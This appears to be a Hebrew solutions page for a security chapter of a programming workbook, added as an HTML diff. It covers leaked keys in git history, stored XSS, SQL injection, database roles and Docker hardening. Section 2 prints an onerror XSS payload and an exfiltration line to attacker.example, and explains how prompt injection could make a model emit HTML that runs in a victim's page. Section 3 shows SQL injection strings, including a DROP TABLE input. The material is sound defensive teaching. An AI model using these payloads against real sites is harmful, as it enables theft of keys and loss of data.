@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>פתרונות לפרק 14 | מאחורי הקוד</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <a href="../chapter-14.html">→ חזרה לפרק 14</a>
+    <span>פתרונות לפרק 14</span>
+    <span class="spacer"></span>
+    <button class="btn" type="button" data-print>הדפסה</button>
+  </div>
+</div>
+
+<main class="page">
+
+<header class="chapter-head">
+  <div class="chapter-num">פתרונות</div>
+  <h1>פרק 14 · אבטחה</h1>
+  <p class="lead">קראו פתרון רק אחרי שניסיתם את התרגיל בעצמכם. הפלטים כאן הם מה שהתקבל באמת; המזהים, ה-<span class="en">hashes</span> והזמנים אצלכם יהיו אחרים. הקוד המלא נמצא ב-<code>checkpoints\chapter-14</code>.</p>
+</header>
+
+<h2><span class="sec">1</span>מפתח שנמחק ולא נעלם</h2>
+<div class="codebox output">
+  <div class="label"><span>gitleaks git -v --redact . on try/leak (shortened)</span></div>
+<pre><code>Finding:     ANTHROPIC_API_KEY=REDACTED
+Secret:      REDACTED
+RuleID:      anthropic-api-key
+Entropy:     3.613496
+File:        .env.example
+Line:        5
+Commit:      7583c9026a7a94ce503b1a458cd204f941cee074
+Author:      Reader
+Fingerprint: 7583c9026a7a94ce503b1a458cd204f941cee074:.env.example:anthropic-api-key:5
+
+INF 12 commits scanned.
+WRN leaks found: 1</code></pre>
+</div>
+<p>הקובץ כבר היה נקי, והסורק עדיין מצא, כי הוא קורא את כל ה-<span class="en">commits</span>: ה-<span class="en">commit</span> הראשון מכיל את המפתח לתמיד, וה-<span class="en">commit</span> השני רק מוסיף שינוי מעליו. קוד היציאה 1, ולכן ב-CI ה-<span class="en">pull request</span> היה אדום.</p>
+<div class="codebox output">
+  <div class="label"><span>after git switch main; git branch -D try/leak</span></div>
+<pre><code>Deleted branch try/leak (was 3f1577f).
+INF 10 commits scanned.
+INF no leaks found
+
+1169901 HEAD@{0}: checkout: moving from try/leak to main
+3f1577f HEAD@{1}: commit: Remove the key again
+7583c90 HEAD@{2}: commit: Fill in the example settings
+
+PS&gt; git show 7583c90:.env.example | Select-String "^ANTHROPIC"
+ANTHROPIC_API_KEY=sk-ant-api03-example-not-a-real-key-example-not-a-real-key-...</code></pre>
+</div>
+<p>אחרי מחיקת הענף gitleaks לא מוצא, כי הוא סורק רק <span class="en">commits</span> שענף או תגית מצביעים עליהם. אבל המפתח לא נעלם: ה-<span class="en">commit</span> עדיין בתוך <code>.git</code>, וה-<span class="en">reflog</span> זוכר אותו (כברירת מחדל, 30 יום ל-<span class="en">commit</span> שאף ענף לא מגיע אליו). "הסורק שקט" אינו "הסוד איננו".</p>
+<p>אילו הענף נדחף ל-GitHub: <strong>1.</strong> להחליף את המפתח מיד (ב-<code>platform.claude.com</code>: מפתח חדש, ה-<code>.env</code> מתעדכן, הישן מבוטל), לפני כל דבר אחר, כי מרגע הדחיפה הוא אצל אחרים. <strong>2.</strong> לבדוק בלוח הבקרה אם השתמשו בו. <strong>3.</strong> לספר לצוות. <strong>4.</strong> לנקות את ההיסטוריה (<code>git filter-repo</code>, דחיפה בכוח, וכולם משכפלים מחדש), או להשאיר: אחרי שהמפתח בוטל, הוא מחרוזת חסרת ערך. הניקוי חשוב בעיקר כדי שהסורק יפסיק לצעוק ושאף אחד לא יעתיק את הדפוס.</p>
+
+<h2><span class="sec">2</span>שורה אחת של <code>innerHTML</code></h2>
+<div class="codebox output">
+  <div class="label"><span>the page's DOM after one send, with innerHTML (headless Edge, shortened)</span></div>
+<pre><code>&lt;title&gt;stolen: xss-lab-key-not-a-real-secret&lt;/title&gt;
+&lt;div class="msg user" dir="auto"&gt;&lt;img src="x" onerror="document.title='stolen: '+..."&gt;&lt;/div&gt;
+&lt;div class="msg agent" dir="auto"&gt;[mock reply, turn 1] You said: &lt;img src="x" onerror="..."&gt;&lt;/div&gt;</code></pre>
+</div>
+<p>בכותרת הלשונית הופיע המפתח שהדבקתם: הקוד ב-<code>onerror</code> רץ בתוך הדף וקרא אותו מ-<code>sessionStorage</code>. פעמיים בכל שליחה, כי שתי ההודעות עוברות דרך <code>show()</code>: ההודעה שלכם, ותשובת ה-<span class="en">mock</span> שמצטטת אותה. בטעינה מחדש, <code>loadHistory()</code> מציג את השיחה מבסיס הנתונים דרך אותה <code>show()</code>, והקוד רץ שוב: הוא <strong>שמור</strong> (<span class="en">stored XSS</span>), לא חד-פעמי. עם <code>textContent</code> הכותרת נשארת <code>my-agent</code>, והתגית מוצגת כטקסט: <code>&amp;lt;img src=x ...&amp;gt;</code>.</p>
+<p>במקום <code>document.title</code>, תוקף היה כותב <code>fetch("https://attacker.example/?k=" + ...)</code> ושולח לעצמו את המפתח, או שולח בשמכם בקשות ל-<code>/chat</code> ול-<code>DELETE</code>. ואיך זה מגיע למשתמש אחר, כשכל שיחה שייכת ללקוח אחד? דרך התשובה של המודל: מי שמצליח לגרום למודל לכתוב HTML (<span class="en">prompt injection</span>, למשל בתוך מסמך שהסוכן קורא) גורם לדף של <em>הקורבן</em> להריץ אותו. לכן גם תשובת המודל היא קלט.</p>
+<p>(בבניית הפרק, הבדיקה נעשתה עם Edge במצב <span class="en">headless</span> מול עותק זמני של הדף, שהקליד ושלח לבד. בדפדפן רגיל התוצאה זהה, ביד.)</p>
+
+<h2><span class="sec">3</span>השאילתה הבטוחה</h2>
+<div class="codebox">
+  <div class="label"><span>scripts\injection_lab.py</span></div>
+<pre><code>def find_safe(db: sqlite3.Connection, name: str) -&gt; list[tuple[str, str]]:
+    """RIGHT: the SQL text is fixed; the input travels separately, as a value (a parameter)."""
+    sql = "SELECT name, private_note FROM users WHERE name = ?"
+    print(f"  SQL sent: {sql}   value: {name!r}")
+    return db.execute(sql, (name,)).fetchall()</code></pre>
+</div>
+<p><code>"Dana"</code>: שתי הגרסאות מחזירות את השורה של דנה. <code>"x' OR '1'='1"</code>: הלא-בטוחה מחזירה את שלוש השורות, הבטוחה <code>[]</code> (14.6). והשלישי:</p>
+<div class="codebox output">
+  <div class="label"><span>uv run python scripts/injection_lab.py "Dana'; DROP TABLE users; --" (shortened)</span></div>
+<pre><code>unsafe:
+  SQL sent: SELECT name, private_note FROM users WHERE name = 'Dana'; DROP TABLE users; --'
+...
+sqlite3.ProgrammingError: You can only execute one statement at a time.</code></pre>
+</div>
+<p>הקלט הפך את השאילתה לשתי פקודות: חיפוש, ו-<code>DROP TABLE</code>. מה שהציל כאן הוא <code>sqlite3</code>, ש-<code>execute</code> שלו מסרב ליותר מפקודה אחת. זה מזל, לא הגנה: <code>executescript</code>, או <span class="en">drivers</span> אחרים, מריצים את שתיהן, והטבלה נעלמת. הגרסה הבטוחה לא הגיעה לרוץ בהרצה הזו (הסקריפט נעצר בשגיאה); כשמריצים רק אותה, היא מחפשת משתמש ששמו הוא כל המחרוזת ומחזירה <code>[]</code>.</p>
+<div class="codebox output">
+  <div class="label"><span>Select-String ... '\btext\(|execute\("' -CaseSensitive</span></div>
+<pre><code>api.py:207: connection.execute(text("SELECT 1"))
+db.py:66: connection.execute("PRAGMA foreign_keys = ON")
+copy_conversations.py:17: found = connection.scalar(text("SELECT version_num FROM alembic_version"))
+copy_conversations.py:45: text(
+index_lab.py:33: plan = db.execute("EXPLAIN QUERY PLAN " + QUERY, ("c1",)).fetchall()
+index_lab.py:44: count = db.execute("SELECT COUNT(*) FROM messages").fetchone()[0]
+index_lab.py:48: db.execute("CREATE INDEX ix_messages_conversation_id ON messages (conversation_id)")
+injection_lab.py:17: db.execute("CREATE TABLE users (name TEXT, private_note TEXT)")</code></pre>
+</div>
+<p>בכל אחד מהם הטקסט קבוע, וקלט (כמו <code>"c1"</code> ב-<code>index_lab</code>) עובר כפרמטר. <code>"EXPLAIN QUERY PLAN " + QUERY</code> מחבר שתי מחרוזות שכתבתם בעצמכם, לא קלט. בשורה 45 של <code>copy_conversations.py</code> יש <code>setval</code> עם שם טבלה קבוע. אף אחד לא מקבל קלט מבחוץ, וכל שאר הקוד עובר דרך SQLAlchemy. החיפוש הזה כדאי לפני כל <span class="en">review</span>: <code>text(f"...")</code> הוא דגל אדום.</p>
+
+<h2><span class="sec">4</span>משתמש בסיס נתונים לאפליקציה בלבד</h2>
+<div class="codebox">
+  <div class="label"><span>PowerShell</span></div>
+<pre><code>docker compose exec db psql -U agent -c "SELECT rolname, rolsuper FROM pg_roles WHERE rolname = 'agent'"
+docker compose exec db psql -U agent -c "CREATE ROLE agent_app LOGIN PASSWORD 'app-local-only'" -c "GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO agent_app" -c "GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO agent_app" -c "ALTER DEFAULT PRIVILEGES FOR ROLE agent IN SCHEMA public GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO agent_app" -c "ALTER DEFAULT PRIVILEGES FOR ROLE agent IN SCHEMA public GRANT USAGE ON SEQUENCES TO agent_app"
+docker compose exec db psql -U agent_app -d agent -c "SELECT count(*) FROM conversations"
+docker compose exec db psql -U agent_app -d agent -c "DROP TABLE messages"
+docker compose exec db psql -U agent_app -d agent -c "ALTER TABLE conversations ADD COLUMN x int"</code></pre>
+</div>
+<div class="codebox output">
+  <div class="label"><span>output</span></div>
+<pre><code> rolname | rolsuper
+---------+----------
+ agent   | t
+(1 row)
+
+CREATE ROLE
+GRANT
+GRANT
+ALTER DEFAULT PRIVILEGES
+ALTER DEFAULT PRIVILEGES
+ count
+-------
+   135
+(1 row)
+
+ERROR:  must be owner of table messages
+ERROR:  must be owner of table conversations</code></pre>
+</div>
+<p><code>agent</code> הוא <span class="en">superuser</span>: כך תמונת Postgres יוצרת את <code>POSTGRES_USER</code>. כלומר ה-<code>api</code> של היום יכול למחוק את בסיס הנתונים כולו, לקרוא קבצים מהשרת, ליצור משתמשים. <code>agent_app</code> קורא וכותב שורות, ולא יותר. עם <code>DATABASE_URL=postgresql+psycopg://agent_app:app-local-only@db:5432/agent</code> ה-<code>api</code> ענה 200 על הודעה (<code>check_schema</code> קורא את <code>alembic_version</code>, ומותר לו). <code>psql</code> בתוך ה-<span class="en">container</span> לא שאל סיסמה, כי תמונת Postgres סומכת על חיבורים מקומיים; חיבור ברשת דורש אותה.</p>
+<p><code>migrate</code> נשאר עם <code>agent</code>, כי <span class="en">migration</span> יוצרת ומשנה טבלאות, וזה מותר רק לבעלים. שני משתמשים, שני תפקידים: גם אם ה-<code>api</code> נפרץ, הסכמה מוגנת.</p>
+<p>כדי שזה יעבוד על <span class="en">volume</span> חדש: קובץ SQL ב-<code>/docker-entrypoint-initdb.d</code> (רץ רק ביצירת ה-<span class="en">volume</span>), או צעד בתוך <code>migrate</code> שיוצר את המשתמש אם אינו קיים. וב-<code>deploy\</code>: סוד נוסף לסיסמה של <code>agent_app</code>, ושני <code>DATABASE_URL</code> שונים ל-<code>api</code> ול-<code>migrate</code>. לא חיברנו את זה ל-compose בפרק הזה; זה פער 3 ב-<code>docs\security.md</code>.</p>
+
+<h2><span class="sec">5</span><span class="en">Image</span> בשני שלבים</h2>
+<div class="codebox">
+  <div class="label"><span>Dockerfile (shortened)</span></div>
+<pre><code><span class="cm"># --- stage 1: build the virtual environment ---</span>
+FROM python:3.13-slim AS build
+COPY --from=ghcr.io/astral-sh/uv:0.11.14 /uv /bin/uv
+WORKDIR /app
+COPY pyproject.toml uv.lock ./
+RUN uv sync --locked --no-dev
+
+<span class="cm"># --- stage 2: what runs ---</span>
+FROM python:3.13-slim
+WORKDIR /app
+COPY --from=build /app/.venv /app/.venv
+COPY . .
+...
+USER app</code></pre>
+</div>
+<div class="codebox output">
+  <div class="label"><span>docker image ls, and checks inside the new image</span></div>
+<pre><code>before (one stage):  371MB
+after (two stages):  286MB
+
+PS&gt; docker run --rm my-agent:multistage ls /bin/uv
+ls: cannot access '/bin/uv': No such file or directory
+PS&gt; docker run --rm my-agent:multistage id
+uid=10001(app) gid=999(app) groups=999(app)</code></pre>
+</div>
+<p>85 MB פחות, ובעיקר: אין בתוך ה-<span class="en">image</span> מנהל חבילות שמי שפורץ יכול להשתמש בו כדי להתקין כלים. ה-<code>.venv</code> עובד אחרי העתקה כי שני השלבים יוצאים מאותו <span class="en">image</span>, באותו נתיב: הקבצים ב-<code>.venv\bin</code> מצביעים על <code>/usr/local/bin/python3.13</code> ועל <code>/app/.venv</code>. שלב בנייה על Python אחר, או העתקה לנתיב אחר, היו שוברים אותו.</p>
+<p>והבדיקה: <code>test_python_version.py</code> חיפש את ה-<code>FROM</code> <em>הראשון</em> בלבד. שלב שני על <code>python:3.12-slim</code> היה עובר אותה. התיקון בודק את כולם:</p>
+<div class="codebox">
+  <div class="label"><span>tests\test_python_version.py</span></div>
+<pre><code>    <span class="cm"># Every stage: a build stage on another Python would build packages for the wrong one.</span>
+    bases = re.findall(r"^FROM python:(\S+)-slim", dockerfile, re.MULTILINE)
+    assert bases, "the Dockerfile does not start FROM python:&lt;version&gt;-slim"
+    assert set(bases) == {pinned_version()}</code></pre>
+</div>
+<p>מה עוד אפשר להוריד: <span class="en">distroless</span> (תמונות בלי <span class="en">shell</span> ובלי מנהל חבילות, רק Python והספריות), או <code>python:3.13-alpine</code> (קטן, אבל חבילות עם קוד C נבנות אחרת). ובצד ה-<code>Dockerfile</code> של שירות ההערות, אותו שינוי מתאים; השארנו אותו בשלב אחד.</p>
+
+<h2><span class="sec">6</span>מודל האיום של המערכת</h2>
+<p>המסמך המלא: <code>checkpoints\chapter-14\docs\security.md</code>. שבע טבלאות ורשימות: נכסים, נקודות כניסה, גבולות אמון, מה נעשה ב-0.14, פערים, מידע אישי, וכלים.</p>
+<p>הפער הראשון ברשימה הוא Kafka בלי אימות. לא כי הוא הסביר ביותר (אין לו פורט במחשב), אלא כי הוא שובר את ההגנות האחרות: מי שנכנס לרשת הפנימית יכול לכתוב אירוע <code>conversation.deleted</code> מזויף או אירועים שמפילים את ה-<span class="en">worker</span>, בלי שום מפתח. סדר אחר, שגם הוא סביר: משתמש בסיס הנתונים קודם, כי את התיקון שלו כבר ניסיתם בתרגיל 4 והוא זול.</p>
+<p>השאלה הקשה ביותר מתוך הארבע: "מה אפשר לראות?". ההודעות עוברות לספק המודל, ללוגים לא, לגיבויים כן, ל-Kafka רק כמספרים. כדי לענות צריך לעקוב אחרי כל עותק של המידע, וזה בדיוק מה ש-14.10 מבקש.</p>
+
+<h2><span class="sec">·</span>ה-commits של הפרק</h2>
+<div class="codebox output">
+  <div class="label"><span>git log --oneline (the intended history)</span></div>
+<pre><code>Write the threat model in docs/security.md (ex. 6)
+Build the image in two stages: uv stays out of the running image (ex. 5)
+Add a SQL injection lab (ex. 3)
+Merge: version 0.14.0, tag v0.14.0
+  Document the security setup; version 0.14.0, notes 0.3.1
+  CI: scan for secrets, audit the packages, pin the actions
+  The chat page keeps the key for the session only
+  Limit /chat per client; refuse big bodies and malformed ids
+  Run the containers as a user without rights
+  Prometheus reads /metrics with its own token
+  Deploy: the api gets only key hashes; the worker refuses its crash switch in prod
+  Keys per client, kept as hashes; a conversation belongs to its client</code></pre>
+</div>
+<p>תרגילים 1, 2 ו-4 לא משאירים <span class="en">commit</span>: ענף שנמחק, שינוי שהוחזר, ופקודות בבסיס הנתונים.</p>
+
+<nav class="footer-nav">
+  <a href="../chapter-14.html">→ חזרה לפרק 14</a>
+  <a href="../index.html">תוכן העניינים</a>
+</nav>
+
+</main>
+<script src="../assets/workbook.js"></script>
+</body>
+</html>
